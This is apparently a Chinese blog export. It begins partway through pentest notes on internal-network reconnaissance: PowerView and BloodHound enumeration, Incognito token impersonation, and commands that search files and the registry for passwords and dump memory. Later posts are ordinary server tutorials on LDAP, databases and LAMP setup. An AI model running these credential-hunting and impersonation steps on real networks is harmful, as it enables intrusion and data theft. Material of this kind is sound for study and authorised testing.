1net group "domain Admins" /domain 收集所有活动域会话的列表 12# 使用Netsess.exe插叙每个域控制器，netsess -h 将域管理员列表与活动会话列表交叉引用，以确定哪些IP地址具有活动域令牌 12##也有其他的的GDA脚本(Get Domain Admins) https://github.com/nullbind/Other-Projects/tree/master/GDA 如果没有会话： 隔一段时间，等着有会话 / 脚本自动隔一段时间运行 c.扫描远程系统上运行的任务前提：使用了共享 d.扫描远程系统上NetBISO信息NetBISO是一个协议，端口137,138,139之类也可使用工具：nbtscan 模拟域管理员的方法如果已经拥有了meterpreter会话，就可以使用Incognito来模拟域管理者添加一个域管理员，通过尝试遍历系统中所有可用的授权令牌来添加新的管理员第四章见 利用 PowerShell 收集域信息PowerShellPowerShell常用的执行权限共有四种，具体如下。123456Restricted：默认设置，不允许执行任何脚本。Allsigned：只能运行经过证书验证的脚本。Unrestricted：权限最高，可以执行任意脚本。RemoteSigned：本地脚本无限制，但是对来自网络的脚本必须经过签名。在 PowerShell 中输入“Get-ExecutionPolicy”，看到为默认 Restricted 权限 PowerView 是一款依赖 PowerShell 和 WMI 对内网域情况进行查询的常用渗透脚本，PowerView 集成在PowerSploit 工具包中下载地址 BypassUAC 最直接的办法： -ExexutionPolicy ByPass PowerView 中的常用命令1234567891011121314151617181920# 先 Import-Moudle .\PowerView.ps1Get-NetDomain #获取当前用户所在的域名称Get-NetUser #返回所有用户的详细信息Get-NetDomainController #获取所有域控制器Get-NetComputer #获取所有域内机器的详细信息Get-NetOU #获取域中的 OU 信息Get-NetGroup #获取所有域内组和组成员信息Get-NetFileServer #根据 SPN 获取当前域使用的文件服务器Get-NetShare #获取当前域内所有网络共享Get-NetSession #获取在指定服务器存在的会话信息Get-NetRDPSession # 获取在指定服务器存在的远程连接信息Get-NetProcess #获取远程主机的进程信息Get-UserEvent #获取指定用户的日志信息Get-ADObject #获取活动目录的对象信息Get-NetGPO #获取域所有组策略对象Get-DomainPolicy # 获取域默认或域控制器策略Invoke-UserHunter #用于获取域用户登录计算机及该用户是否有本地管理权限Invoke-ProcessHunter #查找域内所有机器进程用于找到某特定用户Invoke-UserEventHunter #根据用户日志获取某域用户登录过哪些域机器 域分析工具 BloodHound 通过图与线的方式，把域内信息直观的展示 https://github.com/BloodHoundAD/BloodHound/releases/download/2.0.4/BloodHound-win32-x64.zip 配置环境1.下载安装jdk并配置2.下载安装Neo4j（Neo4j Server -&gt; Community Server-&gt;Windows）3.启动Neo4j数据库服务端(neo4j-&gt;非关系型数据库. 进入解压后的bin，输入命令ndo4j.bat console启动服务)4.浏览器输入：127.0.0.1:7474/browser，用户名密码默认neo4j4.下载BloodHound, 解压后双击exe启动， 输入bolt://localhost:7687和账户密码，就安装好了 使用主界面按钮和选项描述：…… 采集数据 哪些用户登录了哪些机器 哪些用户拥有管理员权限 那些用户和组属于哪些组 BloodHound采集需依赖PowerView.ps1的BloodHound：BloodHound分为两部分： 1.PowerShell采集器脚本(SharpHound.ps1) 2.可执行文件SharpHound.exe 123# 使用SharpHound.exe采集域内信息把SharpHound.exe复制到目标机器sh.exe -c all 导入数据在当前目录下，会生成xxx_BloodHound.zip`压缩包可以把压缩文件放到界面上节点信息以外的任意位置 查询信息主界面左上角的查询Queries, 进入模块，可以看到预定义的常用查询条件 按住ctrl键，可以循环显示； 在其图标上按住鼠标左键可以移动位置 敏感数据的防护 价值比较高的东西基本上是全部在内网的 资料/数据/文件的定位流程 定位内部人事组织结构。 在内部人事组织中寻找需要监视的相关人员。 定位相关人员的机器。 监视相关人工作时存放文档的位置。 列出存放文档服务器的目录。 定位内部人事组织结构1. 人事组织结构图类似公司结构图可以在目标的外部站点(类如首页“关于我们” )和网上暴露的信息(类如发表在招聘网的各类岗位名称)来分析,或者在内网电脑中寻找类似的人事组织结构图, 再结合分析人事资料里相关员工资料与域内用户名或者用户组的对应 关系, 可以很快定位到你需要寻找的人员使用的机器 2. 人力资源主管个人电脑在内网中通过上述种种方法定位到人力资源主管个人机器,通常单位人力资源主管电脑中会存在公司所有人员的身份信息及相关材料,寻找到人力资源主管个人机器后在其电脑中寻找公司人力资源相关文档得存放位置,然后从人力资源文档中寻找公司相关人员信息,直至收集到你所需要的材料。 net group /domain可以查询域内所有用户组的信息, 同样可以利用该命令来定位公司内部人事结构除了内置重点组外, 自建的域组需要特别关注1234(1)IT组/研发组: 他们掌握了大量的内网密码,数据库密码等。(2)秘书组: 他们掌握着大量的目标机构的内部传达文件和资料,为信息分析业务提供信息。(3)财务组: 他们掌握着目标机构大量的资金往来与目标企业的规划发展,并且可以通过资金表,来判断出目标组织的整体架构。(4)CXX组: 如ceo cto coo等,不同的组织名字不同,如部长、厂长、经理等,会拥有目标机构的机密信息 重点核心业务机器及敏感信息防护 重点核心业务机器是渗透测试人员通常比较关心的机器,因此需要做好相应的防护措施。 1.核心业务机器12345678910- 高管/系统管理员/财务/人事/业务人员的个人计算机。- 产品管理系统服务器(仓库管理系统)- OA 办公系统服务器。- 财务应用系统服务器。- 核心产品源码服务器(对于 IT 公司,会架设自己的 SVN 或者 GIT 服务器)- 数据库服务器。- 文件服务器/共享服务器。- 邮件服务器。- 网络监控系统服务器。- 其他服务器(分公司、工厂) 2.各类敏感文件信息123456- 站点源码备份文件、数据库备份文件、配置文件备份等(后缀 XX.zip,XX.sql 等)- 各类数据库的 Web 管理入口,如 phpmyadmin、adminer 等。- 浏览器密码和浏览器 cookie(IE、Chrome、Firefox)- 其他用户会话、3389 和 ipc$连接记录、各用户回收站的信息等。- Windows 无线密码。- 目标内部的各种账号和密码信息,包括邮箱、VPN、FTP、TeamView 等。 应用与文件形式的信息收集说白了就是翻文件（包括一些应用的配置文件、敏感文件、密码、远程连接、员工账号、电子邮箱等） 不管什么途径获得的内网机器,首先需要知道的就是这台机器所属人员的职位、权利,通常一个高权利的人他在内网的权限比一般员工要高很多,他的电脑内也会有很多重要的、敏感的个人或公司内部文件。 用户在内网中工作时,建议不要将一些特别重要的资料放在公开的计算机中,必要时一定要对 Office 文档进行加密,密码也不要太过于简单 常用搜索：1.搜索指定含有任意多关键字的文件名123dir c:\*.doc /sdir /b/s password.txtdir /b/s config.*dir /s *pass* == *cred* == *vnc* ==*.config* 2.搜索文件名为password.txt/xml/ini的文件,这个操作可能造成大量的输出1findstr /si password *.xml *.ini *.txt 3.搜索带有关键词的注册表项,下例中是查询的关键词是 “password”的命令12reg query HKLM /f password /t REG_SZ /sreg query HKCU /f password /t REG_SZ /s 4.对于加密office办公软件1234如果是低版本如2003的话,可以在百度搜一些网上的破解软件进行破解。如果是高版本的话,可以在目标用户打开文件时使用微软SysinternalsSuite套装中的抓取dump的工具-procdump来抓取内存dump,然后用内存查看器直接查看文件内容。 分析域内网段划分情况及拓扑结构 目标主机基本架构的判断常见的 Web 架构：12345678- ASP + Access + IIS 5.0/6.0 + Windows Sever 2003- ASPX + MSSQL + IIS 7.0/7.5 + Windows Sever 2008- PHP + MySQL + IIS- PHP + MySQL + Apache- PHP + MySQL + Ngnix- JSP + MySQL + Ngnix- JSP + MSSQL + Tomcat- JSP + Oracle + Tomcat 域内网段划分信息内网的环境判断,首先需要分析下内网IP分布情况,一般可以通过内网中路由器、交换机等设备、snmp、弱口令等来获取内网网络拓扑或DNS域传送信息泄漏,另外一般大公司都会有内部网站,也可通过内部网站公开内容链接找出部门ip段。 分析出内部网络是怎么划分的?是按照部门划分的网络段?还是按照楼层?还是按照地区?通常内网可分为DMZ区、办公区和核心区(生产区),了解整个内网的网络分布和组成,也有助于我们寻找内网核心业务。 1.DMZ 区1234在实际的渗透测试中,大多数情况下,在外围 Web 中拿到的权限在 DMZ 区。这个区域不属于严格意义上的内网。如果 DMZ 区域访问控制策略配置合理,DMZ 区会处在内网区能够访问DMZ 区而 DMZ 区访问不了内网区的情况下,相关知识在第 1 章中已经详细讲解过,此处不再重复。 2.办公区123456789办公区,顾名思义,是指公司员工日常的工作区。办公区的安全防护水平一般不是高,基本防护机制大多为杀毒软件或主机入侵检测产品。在实际应用中,攻击者在获取权限后,利用内网信任关系,很容易扩大攻击面。一般情况下,攻击者很少会直接到达办公区。攻击者如果想进入办公区,可能会使用鱼叉攻击、水坑攻击或者社会工程学等手段。办公区按照系统可分为： OA 系统、邮件系统、财务系统、文件共享系统、域控、企业版杀毒系统、内部应用监控系统、运维管理系统等,按照网络段可分为域管理网段、内部服务器系统网段、各部门分区网段等。按照网络段可分为:域管理网段、内部服务器系统网段、各部门分区网段等。 3.核心区1234567核心区一般存放企业最重要的数据、文档等信息资产,如域控制器、核心生产机器等,安全设置也最为严格。根据目标开展的业务不同,相关服务器可能存在于不同的网段上。通过分析服务器上运行的服务和进程,可以推断出目标主机使用的运维监控管理系统和安全防护系。在内网中横向移动时,会优先查找这些主机。核心区按照系统可分为业务系统、运维监控系按照网络段可分为:各不同的业务网段、运维监控网段、安全管理网段等。 多层域结构分析我们需要先分析出当前内网是否存在多层域、现在这计算机所在的域是几级子域、这个子域的域控制器及根域的域控制器是哪些、其他域的域控制器是哪些、域之间是否存在域信任关系等。 绘制内网拓扑图 基础信息搜集- 思维图]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>内网</tag>
        <tag>信息搜集</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-LDAP]]></title>
    <url>%2Fubuntu-server-LDAP%2F</url>
    <content type="text"><![CDATA[LDAP 看书前先看目录 理解不同于文件系统的目录(D/d) -&gt; 首字母大写是目录服务，首字母小写的文件系统目录 目录服务是企业网络的核心基础结构1234- 如此重要的服务并不被大多数熟悉- 很少独立使用，与其他服务结合使用- 微软的企业战略（埋坑: 一旦底层用了微软的AD,你以后的一些肯定也要用我的集成的产品）- 类似: 每一本书都有自己的目录 数据集中存储的应用需求1234- 集中存储、集中管理、集中定位- 身份认证、公钥分发、邮件路由、地址查询、应用配置、单点登录(SSO -&gt; 只登录一次就不用重复登录了)- 面向大量频繁的数据查询操作，少量写操作（基本不变的数据）- 权限限制授权用户查询 我是否应该使用目录服务(根据自己公司情况)12345678- 用户认证- 机器认证- 用户和组- 电话地址薄- 组织呈现- 资产跟踪- 集中应用配置- PEX / 网络设备配置 DAP软件架构 不同与SQL的后端层级化数据库（主要面向查询操作） 与DNS的分布式结构更接近，命名上通常与DBS命名保持一致(在目录服务内所有存储对象都有唯一的路径名称) 数据库基于键值对的方式存储数据 标准统一的服务前端应用查询访问接口(基于OSI协议栈, X.500) 统一的客户端查询组件和协议(C/S) 支持通信会话加密 Directory information tree (DIT) 与自建数据库开发相比 专门针对查询服务的数据库结构类型 统一标准的查询结构以及通信协议（DAP -&gt;目录访问协议） LDAP Lightweight Directoy Access Protocol 轻量目录访问服务 命名上通常与DBS命名保持一致(在目录服务内所有存储对象都有唯一的路径名称) 数据库基于键值对的方式存储数据 X.500标准的部分特性集, 各厂商不同 基于TCP/IP协议通信(TCP 389) 可构建面向互联网和本地网络的目录服务 最常见的LDAP服务1234# 微软的活动目录 AD企业网络资源全部加入域，统一存储、统一呈现、统一管理、安全边界# Novell eDirectory 命名空间12345678910111213# 全局路径： Distinguished Name (DN)# 相对路径： Relative Distinguished# 目录容器： Directory Container (DC) 每一层# 组织单位: Organisation Unit (OU) 通常按照部门划分# 数据项： entries (object, class) 一组预先定义的属性集合 uid, 姓，名，帐号，邮箱，电话, 照片...# 基础架构：Schema objectClass 定义所有对象类型及其属性 Schame 可按应用需要扩展(美国对象在ASN.1结构中都有自己的位置 -- SNMP)# 通用名： common name (CN) 传统命名空间 无固定的命名规则 按照地理空间命名 12# 写法uid=babs, ou=People, dc=example, dc=com LDAP协议LDAP最初作为TCP/IP客户udan与X.500目录服务网关之间发通信协议LDAPv3: 强身份认证和数据加密 基于证书的SSL加密 使用Unicode编码实现国际化 Schema可扩展 安装并配置LDAP 拿出一台服务器作为专门的LDAP的服务器，以后的身份认证都使用集中的LDAP的(不局限与操作系统，Web应用也可以，只要程序支持ldap就可以使用这个做身份认证) 先修改主机名：1234567sudo sed -i 's/preserve_hostname:false /preserve_hostname:true /g' /etc/cloud/cloud.cfgecho "192.168.0.104 ldap.lab.com" | sudo tee -a /etc/hosts # ip地址与名称的解析关系# 修改主机名sudo hostnamectl set-hostname ldap.lab.comreboot 安装 OpenLDAP12345678910# Ubuntu Linux中默认的LDAP实现sudo apt install slapd ldap-utils# slapd 是服务端和后台进程(即LDAP server)# ldap-utils （ldap工具） ldapadd # 添加数据 ldapdelete # 删除数据 ldapmodify # 修改 ldapsearch # 查询（最常使用） ldappasswd # 修改密码 ... ... 修改配置文件1234 # sudo vim /etc/ldap/ldap.confBASE dc=lab,dc=com # 目前和dns的域名保持一直即可URI ldap://ldap.lab.com:389 # 可以通过这个地址对..进行查询 初始化配置12345# 一次就够了!!!sudo dpkg-reconfigure slapd# 还可以设置一次密码# 数据库建议选择MDB 验证123456789101112# 多种验证方式sudo slapcatsudo tree /etc/ldap/slapd.d/ # 有内容就可# 默认管理员帐号 adminldapsearch -x -LLL -b dc=lab,dc=com ldapsearch -x -LLL -b dc=lab,dc=com dn # 后面的内容是筛选# -x 简单身份验证# -LLL 以标准LDIF文件格式显示结果# -b 基地址 向目录中添加记录保存信息123456789101112131415161718192021222324252627282930313233# 保存信息到文件# vim add.ldif# ou: 物理的层级结构划分dn: ou=People,dc=lab,dc=comobjectClass: organizationalUnitou: People# 物理的dn: ou=Group,dc=lab,dc=com # ou的名称叫Group, 一个对象只能在一个ou中, ou是物理上的objectClass: organizationalUnitou: Group# 逻辑的# 组帐号sdn: cn=delevopment,ou=Group,dc=lab,dc=com # 创建一个组，cn别名objectClass: organizationalUnitcn: delevopmentgidNumber: 3000# 用户帐号dn: uid=zhangsan,ou=People,dc=lab,dc=com # 创建一个组，cn别名objectClass: inetOrgPerson # 继承某些对象类型objectClass: posixAccountobjectClass: shadowAccountuid: zhangsansn: zhanggivenName: sancn: san zhang # 别名displayName: San ZhanguidNumber: 2000gidNumber: 3000 # 让用户加入某个组userPassword: 123465loginShell: /bin/bashhomeDirectory: /home/zhangsan/ 导入：12345ldapadd -x -D cn=admin,dc=lab,dc=com -W -f add.ldif# -x 简单身份验证# -D 指定管理员帐号(完整的别名： cn=admin,dc=lab,dc=com) # -W 提示输入密码# -f 指定ldif文件 验证1234ldapsearch -x -LLL -b dc=lab,dc=com 'uid=zhangsan' cn sn gidNumber uidNumber givenName# 查看属性类型和值 参考网址https://ldapwiki.com/wiki/ObkectClass#Types 修改数据跟上面是类似的 Web管理手动写配置太麻烦，图形化的简化了操作Web应用程序(有很多种)： ldap-account-manager (lam) 12345678910111213141516sudo apt install apache2sudo apt install php php-cgi libapache2-mod-php php-common php-pear php-mbstringsudo a2enconf php7.2-cgi # 激活这个模块sudo systemctl reload apache2sudo systemctl restart apache2sudo apt install ldap-account-manager# ldap-account-manager使用的数据库使用的是目录服务的数据库，但是他的数据也没有写到数据库中，而是存在了配置文件中# 访问即可# http:/192.168.0.104/lam# 点击右上角 LAM configuration 配置 edit server... , 进行简单配置# 其他配置根据自己需求来改 设置安全访问12345sudo vim /etc/apache2/conf-enabled/ldap-account-manager.conf #Require all granted 注释掉所有ip可访问 Require ip 127.0.0.1 192.168.0.0/24# 重启服务 其他ldap基于web的管理工具123456# phpLDAPAdminsudo apt install phpldapadmin# 创建组帐号 # 创建帐号# ... 客户端Windows客户端win自带的GINA提供Windows系统登录界面， 支持本机、域账户登陆 pGina开源身份认证提供者 - 集成并替换window系统默认的GINA - 通过插件支持大量身份验证数据存储(LDAP, MySQL, RADIUS) - `http://pgina.org` 下载安装稳定版 进行一些配置 Linux客户端域名解析1echo "192.168.0.104 ldap.lab.com" |sudo trr -a /etc/hostss 安装客户端12345sudo apt install libnss-ldap libpam-ldap ldap-utils nscd# 指定一些参数ldap://ldap.lab.comdc=lab,dc=comcn=admin,dc=lab,dc=com 修改配置文件1234567891011121314151617181920# sudo vim /etc/nsswitch.confpassswd: compat systemd ldapgroup: compat systemd ldapshadow: compat ldap# sudo vim /etc/pam.d/common-password 删除 use_authtok 这一小块# sudo vim /etc/pam.d/common-session session optional pam_mkhomedir.so skel=/etc/skel umask=077 # 允许创建用户主目录 sudo systemctl restart nscd.service# 验证getent passwd zhangsan reboot# 登录的时候，点击 not list 才能进入刚才的帐号]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
        <tag>LDAP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server- ubuntu-server-数据库管理服务]]></title>
    <url>%2Fubuntu%20server-%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[ubuntu-server-数据库管理服务 数据就是生产力 数据就是应用的核心按照结构组织，存储和管理数据的仓库Oracle, DB2, MySQL, MSSQL, PostgreSQL, Infomix, MongoDB 数据库管理系统(DBMS) MySQL数据库管理 安装1sudo apt install mysql-server 安全配置123sudo mysql_secure_installation# 建议禁止root远程登录# 这里设置的root的密码不是，后面才设置, 因为初始身份认证方式是auth_socket Root帐号密码登录1234567sudo mysql # 初始身份认证方式是auth_socket，所以暂时不需要输入密码 SELECT user,host,authentication_string, plugin,host FROM mysql.user;# 给root设置密码认证方式mysql_native_passwordALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '12345678'; FULSH PRIVILEGES;# 登录mysql -u root -p 创建数据库个人帐号(建议不要使用root进行运行,而应该使用个人帐号, 且密码不能相同)1234create user 'xps'@'%' identified by '12345678';# 赋予权限(4级)# *.* 是哪个库哪个表，这里表示所有库所有表grant all privileges on *.* to 'xps'@'%' with grant option; 修改密码1set password for 'xps'@'%'=password('12345678'); 网络访问帐号(可以远程访问)123456789# 一般这种情况，都限制要操作的库和操作# %use mysql# 直接grant赋予权限，就可以创建不存在的用户grant all privileges on *.* to admin@'%' identified by '12345678' with grant option;# 移除权限revoke all on db_name from user_name;# 查看密码策略(一旦允许网络连接，密码级别就会变成中安全级别了)select @@validate_password_policy; 编辑配置文件12345678# sudo vim /etc/mysql/mysql.conf.d/mysqld.cnf# 修改侦听网卡为自己网卡的ip地址bind-address = 192.168.0.112# 重启网卡# 使用mysql客户端连接， 或Falcon等图形化客户端mysql -h 19.168.0.112 -u root SQL语句增删改查最基本123456789101112131415-- 当前帐号select user();-- 查看已经有的库select databases;-- 选取(切换)库use test;select database();-- 显示表(已选择库)show tables;-- 简单创建库create database test; 创建表123456create table users( id INT NOT NULL PRIMARY KEY AUTO_INCREMENT, name CHAR(25) NOT NULL, pass CHAR(25) NOT NULL, age INT(9) NOT NULL ) char的性能要优于varchar 插入记录12insert into users values(1,'xps','1234567890',20);insert into users(id,name,pass,age) values(null,'xps','1234567890',20); # 指定列 查看表结构12345desc users;show create table users; # Engine=InnoDB 存储引擎show full columns from users; 查询123456select * frm users where age &lt;20 and age &gt;16;select name,pass from users order by age;select name,pass from users order by age desc; # 降序select concat(name,0x7e,pass,0x7e) as user_pass from users; # concat 结合， 表头变成user_passselect group_concat(name, pass) from users; 修改记录1update users set name='xpsss' where id=1; 删除记录1delete from users where id=1; 删除表123drop table tests;drop table if exists tests; 删除库1drop database test; 查看数据引擎123show engines;# 修改存储引擎（这里指定表）alter table student engine=MYISAM; 修改表名1alter table student RENAME student2; 修改字段数据类型1alter table student MODIFY name varchar(30); 修改字段名1alter table student CHANGE name uname varchar(40); 增加字段1alter table student ADD techer_name vchar(20) NOT NULL after id; # 位置放在id字段的后面 删除字段1alter table student FROP teacher_name; 备份备份导出备份库，表123mysqldump -u root -p tes_db &gt;db_back.sqlmysqldump -u root -p test_db users &gt;db_back.sqlmysqldump --all-databases -u root -p &gt;all_db_back.sql 备份指定数据1234567# 先进入sql命令终端，进行导出select * from users; &gt; q.sql## 或者# 1. 先把sql语句保存为文件，echo 'select * from users;' &gt; q.sql# 2.然后执行来进行导出mysql -u root -p test &lt; q.sql &gt;out.csv 导出CSV123show variables like '%secure%'; # 先找到备份路径，找到secure_file_priv路径就是默认导出的路径# 保存， 并执行分隔或换行select * from users into outfile '/var/lib/mysql-files/aaa.csv' fields terminated by ',' enclosed by lines '"' terminated by '\n'; 导入导入1234# 创建库的命令mysqladmin -u root -p create db2 # 也可以在sql终端 create database xxx;# 导入mysql -u root -p db2 &lt; db_bak.sql 导入CSV123LOAD DATA INFILE '/var/lib/mysql-files/aaa.csv' INTO TABLE usersFIELDS TERMINARED BY ',' ENCLOSED BY '"'LINES TERMINARED BY \n IGNORE 1 ROWS; MariDB安装配置安装1sudo apt install mariadb-server 安全认证1sudo mysql_secure_installation 改为密码认证123456sudo mysqluse mysql;select user.host,plugin,password from mysql.user; # 查看update user set plugin='' where user ='root' # mysql_native_password或空就行fulsh privileges; 配置文件12# /etc/mysql/mariadb.conf.d/50-server.cnfbind-address = 0.0.0.0 # 每一个网卡都会侦听3306 主备服务器(数据库复制)复制 ReplicationMaster -&gt; Slave 读/写限定所有库，指定库，表 进行复制 复制原理bin-log 二进制日志所有DB事件先写入bin-logSlave从Master读取bin-log 用途 扩展：Slave分担master负载 分析：数据分析不影响Master 备份：作为一种数据备份手段 分布：异地保存数据副本（也可以实现应用访问本地库） 演示1.安装两台独立的MariaDB服务器123复制之前用导入导出数据库的方式保持Master/Slave数据一致复制前锁定库(禁止写入) # 生产环境 flush tables with read lock; 2.配置 Master123456# suo vim /etc/mysql/conf.d/mysql.cnf #增加如下配置[mysqld]log-bin # 开启bin-log功能binlog-do-db=test# binlog-ignore-db="mysql" # 除了忽略的库，其他的全复制server-id=1 3.配置master的mariadb远程访问bind-address 0.0.0.0 4.重启服务1sudo systemctl restart mariadb 5.配置master创建用户帐号12#192.168.0.111 是slave的地址， *.*允许复制所有数据库, replicate用户名grant replicate *.* to 'replicate'@'192.168.0.111' with identified by 'passwd'; 6.配置Slave12345678## 1.# suo vim /etc/mysql/conf.d/mysql.cnf #增加如下配置[mysqld]server-id=1## 2.开启远程访问bind-address 0.0.0.0## 3. 重启数据库服务 7.登录sql终端 12# master_user是master服务器上创建的mysql的用户change master to master_host="192.168.0.112",master_user="replicate",master_password='password'; 8.打开master锁unlock tables; 9.查看slave状态123-- slave的sql终端show slaves status\Gstart slave; # 如果没启动，可以手动启动 测试效果123456# 在master执行cd test;insert into users values(1,'yyy','pass');delete from users where id=1;# 在slave上查询，发现数据已经同步过来了，近乎实时 Mysqltuner – 配置调优工具包安装1sudo apt install mysql 运行sudo Mysqltuner会生成一堆信息配置调优建议(绿色的表示没问题，其他颜色的可以根据帮助来优化) Postgresql 下一代关系数据库 配置和修改 高并发情况下性能优于MySQL 侦听端口 TCP 5432 安装1sudo apt install postgresql 身份认证 默认使用IDENT身份认证方式 使用与操作系统同名的数据库帐号(postgres相当与MySQL中的root) 进入123sudo -u postgres psql# 直接登录到库的名称(template1是默认生成的)sudo -u postgres psql template1 修改密码12345678910111213141516# sql终端# 使用加密的方式alert user postgres with encrypted password 'your_passwd';\q # 退出# bash终端# 修改配置文件vim /etc/postgresql/10/main/pg_hba.conflocal all postgres md5# 本地登录 所有数据库 身份 密码md5加密# 重启服务# 登录 -W输入密码psql -U postgres -W -d db_name 配置文件1234/etc/postgresql/&lt;version&gt;/main # 配置文件目录/etc/postgresql/10/main/pg_ident.conf # IDENT身份认证配置/etc/postgresql/10/main/postgresql.conf # 网络身份认证配置 # listen_address='*' # IPV6 '::' 网络连接12345678910# 客户端sudo apt install postgresql-client# 设置允许哪些主机连接我们(必须指定掩码)vim /etc/postgresql/10/main/pg_hba.conflocal all postgres 192.168.0.111/32 md5#重启服务# 客户端连接psql -h 192.168.0.112 -U postgres -W -d db_name 创建帐号1234567# postgres权限太大，不建议平时使用# F1 服务器端终端sudo -u postgres createuser xps # gropuser xps# F2 sql命令行create user foobar; # drop user xps 文档手册12345sudo apt install postgresql-doc-10/usr/share/postgresq-doc-10/html/index.html官方文档:https://www.postgresql.org/docs/current/static/tutorial.html 基本指令创建库1234#sudo -u postgres createdb mydb;# 或create database mydb; 删除库123sudo -u postgres dropedb mydb;# 或drop database mydb; 创建表1234567891011121314create database users(uname varchar(25);pwd carchar(25);date date);``插入数据```bashinsert into users values('xps','1234567890','1997-07-07');# 批量插入数据(数据提前保存)copy users from '/home/user/users.txt' 快捷命令12345\c db_name # 切换数据库 （use mydb;）\c - username # 切换用户\l # 列出数据库(show databases;)\dt # 列出表(show tables;)\d table_name # 查看表结构 NoSQL概览与MongoDB 常见的NoSQL数据库类型1.键值对类型 Paper推荐多看看 MongoDB安装1sudo apt-get install -y mongodb 客户端1234567# 本地登录mongo# 远程登录mongo 192.168.0.112:27017/db_name# 常用管理命令help 进入库12use mydb;# 如果不存入数据，他还是就没了 输入数据1234# 创建文档集db.createCollection(&apos;users&apos;)# 插入数据db.users.insert(&#123;&apos;name&apos;:&apos;uuu&apos;,&apos;uid&apos;:123&#125;) 查询库12show dbsshow collections 多赋值1db.users.insert(&#123;&apos;name&apos;:&apos;uuu&apos;,&apos;uid&apos;:123,gid:[111,222,333]&#125;) 查询12345678db.users.find();db.users.findOne(&#123;&apos;uid&apos;:1001&#125;)db.users.findOne(&#123;&apos;uid&apos;:&#123;$gt：1000&#125;&#125;) # 大于db.users.find(&#123;&apos;uid&apos;:&#123;$gt：1000&#125;&#125;) # 大于db.users.find(&#123;$or: [&#123;name:&apos;ubuntu&apos;&#125;, &#123;name;&apos;centos&apos;&#125;]&#125;) # ordb.users.findOne(&#123;&apos;uid&apos;:1001&#125;, &#123;name:0&#125;) # name:0 不显示name字段 修改记录1db.users.update(&#123;&apos;uid&apos;:1001&#125;, &#123;$set:&#123;name:&apos;hhh&apos;&#125;&#125;) 删除记录1db.users.remove(&#123;&apos;uid&apos;:1001&#125;, ) 删除collection1db.users.drop() 删库1db.dropDatabase() 详细用法参考官方文档……]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
        <tag>ubuntu-server-数据库管理服务</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-LAMP]]></title>
    <url>%2Fubuntu%20server-LAMP%2F</url>
    <content type="text"><![CDATA[LAMPLAMP环境安装WordPress 安装LAMP(Linux + Apache + MySQL +PHP)自动安装123456789# 一次性安装 tasksel 简单快捷apt install tasksel# 运行工具sudo tasksel# 选择安装包,q 勾选，确定即可#测试echo "&lt;?php phpinfo();?&gt;" &gt; /var/www/html/info.php 手动安装1234567apt install apache2apt install mysqk-server mysql_secure_installationapt install php libapache2-mod php-mysql#测试echo "&lt;?php phpinfo();?&gt;" &gt; /var/www/html/info.php WordPress 开源免费的个人博客系统 全球1/3的个人博客采用 基于LAMP开发 开箱即用 安装123456wget http://wordpress.org/latest.tar.gzsudo tar -zxvf latest.tar.gz -C /var/www/html# 设置权限sudo chown www-data:www_data -R /var/www/html/myshop# 还没有数据库 创建数据库12345-- 进入sql命令行（建议用户名密码和库名不要这么简单易猜）create database wpdb;create user 'wpuser'@'localhost' identified by '12345678';grant all on wpdb.* to 'wpuser'@'localhost' identified by '12345678' with grant option;flush privileges; 配置文件123456cd /var/www/html/wordpress/cp wp-config-sample.php wp-config.php # 从模板文件复制vim wp-config.php# 修改库名，用户，密码# 他会自动写进去表 虚拟主机不建议使用默认站点1234567cd /etc/apache2/sites-available/cp 000-default.conf myblog.conf vim myblog.conf ServerName www.myblog.com DocumentRoot /var/www/html/wordpress# 其他安全配置 启用站点1234a2ensite myblog.confa2dissite 000-default.conf # 禁用默认站点systemctl reload apache2 Web配置访问设置的域名http://myblog.com 改为中文从官网下载中文语言包解压到/wp-content/目录下，修改wp-config.php1define('WPLANG', 'zh_CN') 或者直接下载中文版https://cn.wordpress.org PHPMyAdmin &amp; 电商网站搭建phpMyAdmin基于Web应用的MySQL管理应用, 本身也是一个应用程序 1.修改身份验证方式1234# 进入sql终端select user,host,plugin from mysql.user;"auth_socket" --&gt; "mysql_native_password" 2.安装PhpMyAdmin1apt install phpmyadmin 3.修改/etc/apache2/apache2.conf主配置文件12# 包含phpmyadmin的配置文件Include /etc/phpmyadmin/apache.conf 测试 http://wwwwww/phpmyadmin/ 电商网站搭建安装prestashop开源的电商平台 开源免费 全球有25万台电商平台使用 基于LAMP套件 1.安装依赖包1sudo apt install php7.2-gd php7.2-xml php7.2-curl php7.2-zip 2.下载123wget https://download.prestashop.com/download/releases/prestashop_1.7.4.1.zipsudo unzip prestashop_1.7.4.1.zip -d /var/www/html/myshopsudo chown www-data:www_data -R /var/www/html/myshop 3.创建数据库123456sudo mysql-- 进入sql命令行（建议用户名密码和库名不要这么简单易猜）create database myshop;create user 'myshop'@'localhost' identified by '12345678';grant all on myshop.* to 'myshop'@'localhost' identified by '12345678' with grant option;flush privileges; 4.虚拟主机(不建议使用默认站点)1234567cd /etc/apache2/sites-available/cp 000-default.conf myshop.conf vim myshop.conf ServerName www.myshop.com DocumentRoot /var/www/html/myshop# 这里只配置了最简单的，其他的配置按照前面的章节自行配置 5.启用站点12345sudo a2enmod rewrite # 启用这个模块sudo a2ensite myshop.conf#a2dissite 000-default.conf # 禁用默认站点systemctl reload apache2 6.访问站点，进行Web配置表名的前缀不要默认，否则如果有漏洞，容易被猜解安装完成之后，要删除install文件 这个网站源码是免费的，但是主题是收费的……且支付接口没国内的 LEMP环境安装NextCloudLEMP(Linux, Nginx, MySQ, PHP)Engine-x -&gt; Nginx 1.安装12345678910111213sudo apt install nginxsudo apt install mariadb-server mariadb-client sudo mysql_secure_installation# 针对不同软件包，安装不同的组件，这里安装下面这些sudo apt install php7.2 php7.2-fpm php7.2-mysql php7.2-mbstring php7.2-xml php7.2-gd php7.2-curl php7.2-imagick php7.2-zip 